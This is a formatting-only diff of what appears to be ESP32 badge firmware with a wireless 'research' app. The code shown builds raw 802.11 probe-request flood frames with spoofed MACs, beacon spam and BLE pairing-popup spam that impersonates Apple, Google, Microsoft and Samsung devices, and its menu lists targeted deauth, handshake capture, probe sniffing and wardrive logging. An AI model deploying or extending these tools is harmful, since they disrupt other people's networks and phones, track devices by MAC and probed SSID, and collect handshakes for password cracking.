@@ -197,22 +197,15 @@ static int deauthBurst(const uint8_t bssid[6], uint8_t channel, int n)
 }
 
 static const char *const BEACON_SSIDS[] = {
-    "FBI Surveillance Van", "Free Public WiFi",  "Pretty Fly for a WiFi", "Loading...",
-    "Mom Use This One",     "Hidden Network",    "The LAN Before Time",   "Drop It Like Its Hotspot",
-    "404 Network Down",     "Abraham Linksys",   "Bill Wi the Science Fi", "It Hurts When IP",
+    "FBI Surveillance Van", "Free Public WiFi", "Pretty Fly for a WiFi",  "Loading...",
+    "Mom Use This One",     "Hidden Network",   "The LAN Before Time",    "Drop It Like Its Hotspot",
+    "404 Network Down",     "Abraham Linksys",  "Bill Wi the Science Fi", "It Hurts When IP",
 };
 static const int NUM_BEACON_SSIDS = sizeof(BEACON_SSIDS) / sizeof(BEACON_SSIDS[0]);
 
 static const char *const RICK_ROLL_LYRICS[] = {
-    "01 Never gonna give you up",
-    "02 Never gonna let you down",
-    "03 Never gonna run around",
-    "04 and desert you",
-    "05 Never gonna make you cry",
-    "06 Never gonna say goodbye",
-    "07 Never gonna tell a lie",
-    "08 and hurt you"
-};
+    "01 Never gonna give you up",  "02 Never gonna let you down", "03 Never gonna run around", "04 and desert you",
+    "05 Never gonna make you cry", "06 Never gonna say goodbye",  "07 Never gonna tell a lie", "08 and hurt you"};
 static const int NUM_RICK_ROLL_LYRICS = sizeof(RICK_ROLL_LYRICS) / sizeof(RICK_ROLL_LYRICS[0]);
 
 static const char *const BEACON_MODES[] = {"Fun Names", "Rick Roll", "Clone Nearby"};
@@ -260,25 +253,25 @@ static int probeFloodOnce(const uint8_t bssid[6], const char *ssid, uint8_t chan
     esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
     uint8_t f[128];
     int n = 0;
-    
-    // 802.11 Probe Request Header Setup: 
+
+    // 802.11 Probe Request Header Setup:
     // Frame Control: 0x40 (Mgmt / Subtype 4), Duration: 0x0000, Destination: Broadcast (FF:FF:FF:FF:FF:FF)
     const uint8_t hdr[] = {0x40, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
     memcpy(f, hdr, sizeof(hdr));
     n = sizeof(hdr);
-    
+
     // Addr2: Source MAC address (Spoofed client MAC)
     memcpy(f + n, bssid, 6);
-    n += 6; 
-    
+    n += 6;
+
     // Addr3: BSSID Wildcard / Broadcast (FF:FF:FF:FF:FF:FF)
     memset(f + n, 0xFF, 6);
-    n += 6; 
-    
+    n += 6;
+
     // Sequence Control (0x0000)
     f[n++] = 0x00;
-    f[n++] = 0x00; 
-    
+    f[n++] = 0x00;
+
     // Information Element: SSID (ID: 0x00)
     int slen = (int)strlen(ssid);
     if (slen > 32)
@@ -286,31 +279,28 @@ static int probeFloodOnce(const uint8_t bssid[6], const char *ssid, uint8_t chan
     f[n++] = 0x00; // Element ID 0
     f[n++] = (uint8_t)slen;
     memcpy(f + n, ssid, slen);
-    n += slen; 
-    
+    n += slen;
+
     // Information Element: Supported Rates (ID: 0x01)
     const uint8_t rates[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
     memcpy(f + n, rates, sizeof(rates));
-    n += sizeof(rates); 
-    
+    n += sizeof(rates);
+
     // Transmit raw frame directly over the Station interface
     return esp_wifi_80211_tx(WIFI_IF_STA, f, n, false) == ESP_OK ? 1 : 0;
 }
-
 
 // ---- BLE pairing-popup spam (NimBLE) -------------------------------------------------------
 // Apple "nearby action" / Google Fast Pair adverts with a fresh random address each time, so
 // nearby phones show a stream of fake pairing pop-ups. This HIJACKS the one NimBLE advertising
 // slot Meshtastic uses for the phone link (so that link drops while running); bleSpamStop()
 // restores Meshtastic's advert.
-static const uint8_t APPLE_ACTIONS[] = {0x27, 0x09, 0x02, 0x1e, 0x13, 0x0b,
-                                        0x01, 0x06, 0x20, 0xc0, 0x0d, 0x2b};
+static const uint8_t APPLE_ACTIONS[] = {0x27, 0x09, 0x02, 0x1e, 0x13, 0x0b, 0x01, 0x06, 0x20, 0xc0, 0x0d, 0x2b};
 static const uint32_t FASTPAIR_MODELS[] = {0xCD8256, 0x92BBBD, 0x821F66, 0x475453, 0x0001F0, 0x0003B9, 0x00000A};
 // Fake device names for the scan response, so each advert looks like a different device instead of
 // the badge's own Meshtastic name.
-static const char *const BLE_NAMES[] = {"AirPods",   "AirPods Pro", "Galaxy Buds", "Pixel Buds", "JBL Flip",
-                                        "Beats Pro", "Bose QC",     "Mi Band 8",   "Echo Buds",  "Tile",
-                                        "WH-1000XM5", "Soundcore"};
+static const char *const BLE_NAMES[] = {"AirPods", "AirPods Pro", "Galaxy Buds", "Pixel Buds", "JBL Flip",   "Beats Pro",
+                                        "Bose QC", "Mi Band 8",   "Echo Buds",   "Tile",       "WH-1000XM5", "Soundcore"};
 
 static void bleSetRandomAddr()
 {
@@ -329,9 +319,9 @@ static int bleSpamOnce(int target)
     int n = 0;
     d[n++] = 0x02;
     d[n++] = 0x01;
-    d[n++] = 0x1A; // flags
+    d[n++] = 0x1A;                                              // flags
     int kind = (target < 4) ? target : (int)(esp_random() % 4); // 4 = All -> random kind
-    if (kind == 0) {         // Apple nearby action
+    if (kind == 0) {                                            // Apple nearby action
         d[n++] = 0x0A;
         d[n++] = 0xFF;
         d[n++] = 0x4C;
@@ -343,7 +333,7 @@ static int bleSpamOnce(int target)
         d[n++] = esp_random() & 0xFF;
         d[n++] = esp_random() & 0xFF;
         d[n++] = esp_random() & 0xFF;
-    } else if (kind == 1) {  // Google Fast Pair (Android)
+    } else if (kind == 1) { // Google Fast Pair (Android)
         uint32_t m = FASTPAIR_MODELS[esp_random() % (sizeof(FASTPAIR_MODELS) / sizeof(uint32_t))];
         d[n++] = 0x06;
         d[n++] = 0x16;
@@ -352,7 +342,7 @@ static int bleSpamOnce(int target)
         d[n++] = (m >> 16) & 0xFF;
         d[n++] = (m >> 8) & 0xFF;
         d[n++] = m & 0xFF;
-    } else if (kind == 2) {  // Windows Swift Pair (Microsoft 0x0006)
+    } else if (kind == 2) { // Windows Swift Pair (Microsoft 0x0006)
         const char *nm = BLE_NAMES[esp_random() % (sizeof(BLE_NAMES) / sizeof(char *))];
         int nl = (int)strlen(nm);
         if (nl > 8)
@@ -366,7 +356,7 @@ static int bleSpamOnce(int target)
         d[n++] = 0x80; // beacon, Swift Pair scenario
         memcpy(d + n, nm, nl);
         n += nl;
-    } else {                 // Samsung EasySetup / Buds (Samsung 0x0075) — best effort
+    } else { // Samsung EasySetup / Buds (Samsung 0x0075) — best effort
         d[n++] = 0x0F;
         d[n++] = 0xFF;
         d[n++] = 0x75;
@@ -599,7 +589,7 @@ static int g_wdCount = 0;
 
 // ---- the app ------------------------------------------------------------------------------
 static const uint32_t FIRE_HOLD_MS = 2000;
-static const int BURST = 8;      // deauth frames per 10 ms tick
+static const int BURST = 8;       // deauth frames per 10 ms tick
 static const int BLE_GAP_MS = 40; // min gap between BLE adverts
 static const int MAX_APS = 32;
 
@@ -610,8 +600,8 @@ class ResearchApp : public App
     Phase phase = P_DISCLAIMER;
     Tool tool = T_DEAUTH;
     int sel = 0, top = 0;
-    int discScroll = 0;            // scroll offset within the disclaimer text
-    uint8_t hopCh = 1;              // probe sniffer / packet monitor channel hop
+    int discScroll = 0;                // scroll offset within the disclaimer text
+    uint8_t hopCh = 1;                 // probe sniffer / packet monitor channel hop
     bool probeShowMac = false;         // probe sniffer: toggle SSID list vs device-MAC view
     uint32_t pktRate = 0, pktLast = 0; // packet monitor
 
@@ -625,7 +615,7 @@ class ResearchApp : public App
 
     uint8_t spamBssid[6] = {0}; // beacon: one BSSID per session (karma style)
     int ssidIdx = 0;
-    int bleTarget = 2; // 0 Apple, 1 Android, 2 both
+    int bleTarget = 2;  // 0 Apple, 1 Android, 2 both
     int beaconMode = 0; // 0 = Fun Names, 1 = Rick Roll, 2 = Clone Nearby
 
     uint32_t hashDownAt = 0;
@@ -688,7 +678,7 @@ class ResearchApp : public App
         scanErr = radioScanStart(SCAN_WIFI); // brings WiFi + promiscuous up (if the badge owns WiFi)
         if (!scanErr) {
             probeReset();
-            g_probeLoggedCount = 0; // fresh dedup for this session's /badge/probes.csv logging
+            g_probeLoggedCount = 0;                  // fresh dedup for this session's /badge/probes.csv logging
             esp_wifi_set_promiscuous_rx_cb(probeCb); // take over the RX callback for probe requests
         }
         hopCh = 1;
@@ -740,9 +730,8 @@ class ResearchApp : public App
                 f.print("MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,"
                         "AltitudeMeters,AccuracyMeters,Type\n");
             char line[128];
-            snprintf(line, sizeof(line), "%02X:%02X:%02X:%02X:%02X:%02X,%s,[%s],,%d,%d,,,,,WIFI\n", m[0], m[1], m[2],
-                     m[3], m[4], m[5], aps[i].name, (aps[i].flags & SF_OPEN) ? "OPEN" : "WPA2", aps[i].channel,
-                     aps[i].rssi);
+            snprintf(line, sizeof(line), "%02X:%02X:%02X:%02X:%02X:%02X,%s,[%s],,%d,%d,,,,,WIFI\n", m[0], m[1], m[2], m[3], m[4],
+                     m[5], aps[i].name, (aps[i].flags & SF_OPEN) ? "OPEN" : "WPA2", aps[i].channel, aps[i].rssi);
             f.print(line);
             f.close();
         }
@@ -789,9 +778,8 @@ class ResearchApp : public App
             bool rnd = (m[0] & 0x02) != 0;
             const char *vend = rnd ? "random" : ouiVendor(m);
             char line[96];
-            snprintf(line, sizeof(line), "%02X:%02X:%02X:%02X:%02X:%02X,%d,%s,%d,%lu,%s\n", m[0], m[1], m[2],
-                     m[3], m[4], m[5], rnd ? 1 : 0, vend ? vend : "?", local[neu[k]].rssi,
-                     (unsigned long)(millis() / 1000), local[neu[k]].ssid);
+            snprintf(line, sizeof(line), "%02X:%02X:%02X:%02X:%02X:%02X,%d,%s,%d,%lu,%s\n", m[0], m[1], m[2], m[3], m[4], m[5],
+                     rnd ? 1 : 0, vend ? vend : "?", local[neu[k]].rssi, (unsigned long)(millis() / 1000), local[neu[k]].ssid);
             f.print(line);
         }
         f.close();
@@ -1168,8 +1156,8 @@ class ResearchApp : public App
             if (tool == T_DEAUTH || tool == T_HANDSHAKE) {
                 drawTitle(d, x, y, tool == T_HANDSHAKE ? "Handshake: confirm" : "Deauth: confirm");
                 d->drawString(x + 2, ry, tgtName);
-                snprintf(b, sizeof(b), "%02X:%02X:%02X:%02X:%02X:%02X", tgtMac[0], tgtMac[1], tgtMac[2], tgtMac[3],
-                         tgtMac[4], tgtMac[5]);
+                snprintf(b, sizeof(b), "%02X:%02X:%02X:%02X:%02X:%02X", tgtMac[0], tgtMac[1], tgtMac[2], tgtMac[3], tgtMac[4],
+                         tgtMac[5]);
                 d->drawString(x + 2, ry + lh, b);
                 snprintf(b, sizeof(b), "channel %d", tgtCh);
                 d->drawString(x + 2, ry + 2 * lh, b);
@@ -1319,8 +1307,8 @@ class ResearchApp : public App
                     // (from the OUI) and the SSID it is probing for, so a MAC can be tied to both
                     // who made the device and the network name it leaks.
                     bool rnd = (m[0] & 0x02) != 0; // locally administered bit => randomized MAC
-                    snprintf(b, sizeof(b), "%02x:%02x:%02x:%02x:%02x:%02x%s %d", m[0], m[1], m[2], m[3], m[4],
-                             m[5], rnd ? " R" : "", local[i].rssi);
+                    snprintf(b, sizeof(b), "%02x:%02x:%02x:%02x:%02x:%02x%s %d", m[0], m[1], m[2], m[3], m[4], m[5],
+                             rnd ? " R" : "", local[i].rssi);
                     d->drawString(x + 2, ry + (2 * i) * lh, b);
                     const char *vend = rnd ? "random" : ouiVendor(m);
                     snprintf(b, sizeof(b), "  %s %s", vend ? vend : "?", local[i].ssid);
@@ -1352,9 +1340,8 @@ class ResearchApp : public App
 };
 
 const char *const ResearchApp::TOOLS[ResearchApp::NUM_TOOLS] = {
-    "Back",           "Targeted deauth", "Beacon spam",    "BLE pairing spam",
-    "Probe sniffer",  "Handshake grab",  "Packet monitor", "Wardrive",
-    "Probe flood"};
+    "Back",           "Targeted deauth", "Beacon spam", "BLE pairing spam", "Probe sniffer",
+    "Handshake grab", "Packet monitor",  "Wardrive",    "Probe flood"};
 
 static ResearchApp *researchAppInst()
 {
